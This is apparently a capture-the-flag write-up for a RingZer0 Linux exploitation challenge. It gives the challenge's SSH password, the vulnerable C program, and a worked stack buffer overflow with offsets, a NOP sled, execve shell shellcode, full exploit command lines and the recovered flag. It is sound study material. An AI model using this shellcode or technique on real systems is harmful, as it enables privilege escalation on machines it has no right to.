@@ -1,0 +1,111 @@
+Pwnage linux
+Challenge 3
+https://ringzer0ctf.com/challenges/81
+
+ssh -p 10080 level3@challenges.ringzer0ctf.com
+Password : b130hOOfGftXUfmRZlgD
+----------------------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+char* concat(char *buf, char *s1, char *s2)
+{
+        // Copy s1 to buf
+        strcpy(buf, s1);
+        // Append s2 to s1 into buf
+        strcat(buf, s2);
+        return buf;
+}
+
+
+int main(int argc, char **argv)
+{
+        char buf[256];
+        char buf1[128];
+        char buf2[128];
+
+        if (argc != 3)
+                return 0;
+
+        // Copy argv[1] to buf1 and argv[2] to buf2
+        strncpy(buf1, argv[1], sizeof(buf1));
+        strncpy(buf2, argv[2], sizeof(buf2));
+
+        concat(buf, buf2, buf1);
+        printf("String result: %s\n", buf);
+        return 0;
+}
+------------------------
+We pass 2 arguments to the binary.
+the first 128 bytes of each arguments is copied in buf1 and buf2.
+
+If the arguments have more than 128 char, strncpy will copy them but won't add a \x00 character at the end of the string.
+
+This is our chance to buffer overflow.
+
+When the fct concat is called, it start by copying buf2 into buf until a \x00 character is seen.
+
+If we pass 128 characters to buf2 and 127 characters to buf1
+	r `python -c 'print("\xbb"*127)'` `python -c 'print("\xcc"*128)'`
+
+The strcpy(buf,buf2) will copy the 128 bytes of buf2 + the 127 bytes of buf1 inside buf.
+At this point we are already at the limit of the 256 bytes of the buf variable (Considering the last \x00).
+
+Then the strcat(buf, buf1) will copy the 127 bytes of buf1 into buf.
+We then overflow 128 bytes.
+
+Hopefully we can use this overflow to change the function return adress and execute some shellcode.
+
+Upon testing, it is the main() return adress that we are changing (which make sense since concat receive pointers to buf, buf1 and buf2 which are located on main() stack)
+
+p &buf = 0xffffda70
+&eip = 0xffffdb7c
+
+&buf - &eip = 268 bytes == 264 buf bytes + 4 bytes of garbage
+
+buf1 will be written 2 times to buf. We need to find the size for it :
+	128 + 2x = 268
+	x = 70
+
+Lets try :
+	r `python -c 'print("\xbb"*70)'` `python -c 'print("\xcc"*128)'`
+
+As expected, the return adress isn't modified.
+
+Let's try to modify the first 2 bytes :
+	r `python -c 'print("\xbb"*71)'` `python -c 'print("\xcc"*128)'`
+
+We succesfully modified 2 bytes of the return adress.
+	r `python -c 'print("\xbb"*72)'` `python -c 'print("\xcc"*128)'`
+Modified it all to xbbbbbbbb
+
+buf2 must contains a nop slide + some shellcode and filler value up to 128 bytes.
+buf1 must contains filler values up until its last 4 bytes which should be the adress of buf
+
+buf2 :
+python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";print("\x90"*nb_nop + shellcode + "\xff" * (128 - nb_nop - len(shellcode)))'
+
+buf1:
+&buf = 0xffffdab0
+python -c 'print("\xbb"*68 + "\xb0\xda\xff\xff")'
+
+It worked ! In gdb, so we are not level4 yet, we need to execute the shellcode on the actual binary.
+
+The difficulty here is that we don't know the exact adress of &buf since it will be different of the one in gdb (Different environment variables, and other stuff).
+
+This is why we use the nop slide since we only need to find the adresse of somewhere in the slide for the code to be executed. Otherwise we would need to find the exact adress of buf.
+
+We will call the binary using its complete path since this is how gdb launch it and this will bring the memory space closer to what it is when running in gdb :
+
+/levels/level3 `python -c 'print("\xbb"*68 + "\xb0\xda\xff\xff")'` `python -c 'nb_nop=50; shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";print("\x90"*nb_nop + shellcode + "\xff" * (128 - nb_nop - len(shellcode)))'`
+
+We were quite lucky, no need to guess the adress, IT WORKED !. The adress probably point to somewhere in the nop slide (Not directly the begining of &buf as it was when we were in gdb).
+
+Now that we have a shell, we can retrieve the flag :
+VHDY2pdYVyXi08kupbos
+
+
+
+
